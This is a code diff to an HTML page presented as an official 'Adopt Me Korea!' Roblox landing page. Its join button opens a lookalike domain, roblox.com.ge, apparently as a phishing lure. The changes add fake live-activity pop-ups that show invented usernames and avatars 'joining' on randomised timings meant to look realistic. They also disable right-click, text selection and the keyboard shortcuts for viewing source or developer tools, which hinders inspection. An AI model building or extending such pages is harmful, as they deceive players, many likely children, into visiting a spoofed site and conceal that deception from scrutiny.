@@ -6,13 +6,13 @@
     <title>Adopt Me Korea! — Official Landing</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Montserrat:wght@700&display=swap" rel="stylesheet">
     <style>
-        /* TEMEL STİLLER */
         body {
             background-color: #0a0c15;
             font-family: 'Inter', sans-serif;
             color: #f2f4fc;
             margin: 0;
             line-height: 1.6;
+            user-select: none;
         }
 
         .container {
@@ -21,7 +21,6 @@
             padding: 40px 24px;
         }
 
-        /* BUTONLAR */
         .btn-group { display: flex; gap: 15px; margin-bottom: 40px; }
         
         .btn-primary {
@@ -51,7 +50,6 @@
 
         .btn-outline-light:hover { background: rgba(255,255,255,0.1); border-color: white; }
 
-        /* SERVER GRID & CARDS */
         .section-header { margin-bottom: 30px; }
         .section-eyebrow { color: #E81F76; font-weight: 700; letter-spacing: 2px; font-size: 0.8rem; margin-bottom: 5px; }
         .section-title { font-size: 2.5rem; font-weight: 800; margin-bottom: 10px; }
@@ -91,27 +89,43 @@
         .tag { background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
         .tag.highlight { background: rgba(232,31,118,0.2); color: #ff9acb; }
 
-        .ping-badge { display: flex; align-items: center; gap: 8px; font-size: 0.8rem; color: #b9c8ff; border-top: 1px solid rgba(255,255,255,0.05); pt: 15px; margin-top: auto; }
+        .ping-badge { display: flex; align-items: center; gap: 8px; font-size: 0.8rem; color: #b9c8ff; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; margin-top: auto; }
         .dot-green { width: 8px; height: 8px; background: #2ED9C3; border-radius: 50%; box-shadow: 0 0 5px #2ED9C3; }
 
-        /* FAQ */
         .faq-list { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; }
         .faq-item { background: rgba(255,255,255,0.03); border-radius: 18px; padding: 20px; border: 1px solid rgba(255,255,255,0.05); }
         .faq-question { font-weight: 700; color: #fff; margin-bottom: 8px; }
         .faq-answer { font-size: 0.9rem; color: #c5d0e6; }
 
-        /* TOAST BİLDİRİMİ */
         #toast {
             position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%);
             background: #E81F76; color: white; padding: 12px 30px; border-radius: 50px;
             font-weight: 700; transition: 0.5s; z-index: 1000; box-shadow: 0 10px 20px rgba(0,0,0,0.3);
         }
         #toast.show { bottom: 30px; }
+
+        .notif-container { position: fixed; bottom: 20px; left: 20px; z-index: 999; pointer-events: none; }
+        .notif {
+            background: rgba(10, 12, 21, 0.95);
+            border-left: 4px solid #E81F76;
+            padding: 12px 18px;
+            border-radius: 8px;
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transform: translateX(-150%);
+            transition: 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+        .notif.active { transform: translateX(0); }
+        .notif-user { font-weight: 800; font-size: 0.85rem; color: #fff; }
+        .notif-msg { font-size: 0.75rem; color: #a5b4d4; }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-<div id="toast">Sunucuya bağlanılıyor...</div>
+<div id="toast">joining server...</div>
+<div class="notif-container" id="notif-container"></div>
 
 <div class="container">
     <div class="btn-group">
@@ -162,8 +176,7 @@
                 <div class="tag-group"><span class="tag">Casual play</span><span class="tag">KR community</span></div>
                 <div class="ping-badge"><span class="dot-green"></span> Ping average: 28ms · Relaxed atmosphere</div>
             </div>
-            
-            </div>
+        </div>
 
         <div style="margin-top: 60px;">
             <div class="section-eyebrow">KNOWLEDGE BASE</div>
@@ -184,21 +197,151 @@
 </div>
 
 <script>
-    const SERVER_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=90956201967759887805089940753111";
+const SERVER_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=90956201967759887805089940753111";
 
-    function handleJoin() {
-        const toast = document.getElementById('toast');
-        toast.classList.add('show');
-        
-        setTimeout(() => {
-            toast.classList.remove('show');
-            window.open(SERVER_URL, '_blank');
-        }, 1500);
+const users = [
+    "Ju_mj26", "polestas", "moonlixghtAngxl", "obsidyn", "MFK005", "swoozeeyeeee", "matedadu", "YysiF",
+    "AgiostaRTS", "Ashley_Adrobez", "bdogaidan", "blackdragonnorth", "dgdggrpr84", "Endufykeuveicdk",
+    "Envillez", "EugeneGGT", "girlgirl_comcities", "Greeble_1", "guardianobot", "IndieThoughtz",
+    "iWhisper_02", "JamesWasNotFounded", "Kittynap_0530", "kral097uj", "MarshyRBLX", "Melisa2004yd",
+    "Mikolaj_432", "MyoMinPain12345", "ruapshsf", "SDJ_10X1110011", "SFCharaFantasy", "sofy7mu",
+    "tolonirogg", "UDNUUBiop", "vayunkerinmiy", "VDRON228", "voidor384", "win_key2", "znhchf"
+];
+
+const userAvatars = {
+    "Ju_mj26": "images/Ju_mj26-headshot-RAD.tk-720x720.png",
+    "polestas": "images/polestas-headshot-RAD.tk-720x720.png",
+    "moonlixghtAngxl": "images/moonlixghtAngxl-headshot-RAD.tk-720x720.png",
+    "obsidyn": "images/obsidyn-headshot-RAD.tk-720x720.png",
+    "MFK005": "images/MFK005-headshot-RAD.tk-720x720.png",
+    "swoozeeyeeee": "images/swoozeeyeeee-headshot-RAD.tk-720x720.png",
+    "matedadu": "images/matedadu-headshot-RAD.tk-720x720.png",
+    "YysiF": "images/YysiF-headshot-RAD.tk-720x720.png",
+    "AgiostaRTS": "images/AgiostaRTS-headshot-RAD.tk-720x720.png",
+    "Ashley_Adrobez": "images/Ashley_Adrobez-headshot-RAD.tk-720x720.png",
+    "bdogaidan": "images/bdogaidan-headshot-RAD.tk-720x720.png",
+    "blackdragonnorth": "images/blackdragonnorth-headshot-RAD.tk-720x720.png",
+    "dgdggrpr84": "images/dgdggrpr84-headshot-RAD.tk-720x720.png",
+    "Endufykeuveicdk": "images/Endufykeuveicdk-headshot-RAD.tk-720x720.png",
+    "Envillez": "images/Envillez-headshot-RAD.tk-720x720.png",
+    "EugeneGGT": "images/EugeneGGT-headshot-RAD.tk-720x720.png",
+    "girlgirl_comcities": "images/girlgirl_comcities-headshot-RAD.tk-720x720.png",
+    "Greeble_1": "images/Greeble_1-headshot-RAD.tk-720x720.png",
+    "guardianobot": "images/guardianobot-headshot-RAD.tk-720x720.png",
+    "IndieThoughtz": "images/IndieThoughtz-headshot-RAD.tk-720x720.png",
+    "iWhisper_02": "images/iWhisper_02-headshot-RAD.tk-720x720.png",
+    "JamesWasNotFounded": "images/JamesWasNotFounded-headshot-RAD.tk-720x720.png",
+    "Kittynap_0530": "images/Kittynap_0530-headshot-RAD.tk-720x720.png",
+    "kral097uj": "images/kral097uj-headshot-RAD.tk-720x720.png",
+    "MarshyRBLX": "images/MarshyRBLX-headshot-RAD.tk-720x720.png",
+    "Melisa2004yd": "images/Melisa2004yd-headshot-RAD.tk-720x720.png",
+    "Mikolaj_432": "images/Mikolaj_432-headshot-RAD.tk-720x720.png",
+    "MyoMinPain12345": "images/MyoMinPain12345-headshot-RAD.tk-720x720.png",
+    "ruapshsf": "images/ruapshsf-headshot-RAD.tk-720x720.png",
+    "SDJ_10X1110011": "images/SDJ_10X1110011-headshot-RAD.tk-720x720.png",
+    "SFCharaFantasy": "images/SFCharaFantasy-headshot-RAD.tk-720x720.png",
+    "sofy7mu": "images/sofy7mu-headshot-RAD.tk-720x720.png",
+    "tolonirogg": "images/tolonirogg-headshot-RAD.tk-720x720.png",
+    "UDNUUBiop": "images/UDNUUBiop-headshot-RAD.tk-720x720.png",
+    "vayunkerinmiy": "images/vayunkerinmiy-headshot-RAD.tk-720x720.png",
+    "VDRON228": "images/VDRON228-headshot-RAD.tk-720x720.png",
+    "voidor384": "images/voidor384-headshot-RAD.tk-720x720.png",
+    "win_key2": "images/win_key2-headshot-RAD.tk-720x720.png",
+    "znhchf": "images/znhchf-headshot-RAD.tk-720x720.png"
+};
+
+function getAvatar(username) {
+    return userAvatars[username] || "images/default.png";
+}
+
+const messages = [
+    "joined Seoul Main Server", "entered Trading Hub", "is now online",
+    "connected to Korea server", "started trading", "joined a VIP server"
+];
+
+function handleJoin() {
+    const toast = document.getElementById('toast');
+    toast.classList.add('show');
+    setTimeout(() => {
+        toast.classList.remove('show');
+        window.open(SERVER_URL, '_blank');
+    }, 1500);
+}
+
+function scrollToServers() {
+    document.getElementById('servers').scrollIntoView({ behavior: 'smooth' });
+}
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && (e.key === 'u' || e.key === 'i' || e.key === 's'))) {
+        e.preventDefault();
+    }
+});
+
+const joinSound = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8b1c3c8b7.mp3?filename=notification-110113.mp3");
+
+function spawnNotif() {
+    const container = document.getElementById('notif-container');
+    const username = users[Math.floor(Math.random() * users.length)];
+    const avatar = getAvatar(username);
+    const message = messages[Math.floor(Math.random() * messages.length)];
+
+    const notif = document.createElement('div');
+    notif.className = 'notif';
+    notif.innerHTML = `
+        <div style="display:flex;align-items:center;gap:12px;">
+            <div style="width:40px;height:40px;border-radius:50%;overflow:hidden;border:2px solid #E81F76;">
+                <img src="${avatar}" style="width:100%;height:100%;object-fit:cover;" onerror="this.src='images/default.png'">
+            </div>
+            <div>
+                <div class="notif-user">${username}</div>
+                <div class="notif-msg">${message}</div>
+            </div>
+        </div>
+    `;
+
+    container.appendChild(notif);
+    requestAnimationFrame(() => notif.classList.add('active'));
+
+    joinSound.currentTime = 0;
+    joinSound.play().catch(()=>{});
+
+    setTimeout(() => {
+        notif.classList.remove('active');
+        setTimeout(() => notif.remove(), 500);
+    }, 4000);
+}
+
+// ✅ GÜNCELLENMİŞ GERÇEKÇİ ZAMANLAMA DÖNGÜSÜ
+function startLoop() {
+    const randomRoll = Math.random() * 100;
+    let nextDelay;
+
+    if (randomRoll > 95) {
+        // %5 İhtimal: Çok yoğun (2-5 saniye)
+        nextDelay = Math.random() * 3000 + 2000;
+    } else if (randomRoll > 70) {
+        // %25 İhtimal: Normal (15-30 saniye)
+        nextDelay = Math.random() * 15000 + 15000;
+    } else if (randomRoll > 30) {
+        // %40 İhtimal: Seyrek (1-2 dakika)
+        nextDelay = Math.random() * 60000 + 60000;
+    } else {
+        // %30 İhtimal: Çok sessiz (2-3 dakika)
+        nextDelay = Math.random() * 60000 + 120000;
     }
 
-    function scrollToServers() {
-        document.getElementById('servers').scrollIntoView({ behavior: 'smooth' });
-    }
+    setTimeout(() => {
+        spawnNotif();
+        startLoop();
+    }, nextDelay);
+}
+
+// İlk bildirimi sayfa açıldıktan 5 saniye sonra başlat
+setTimeout(() => {
+    spawnNotif();
+    startLoop();
+}, 5000);
 </script>
 
 </body>
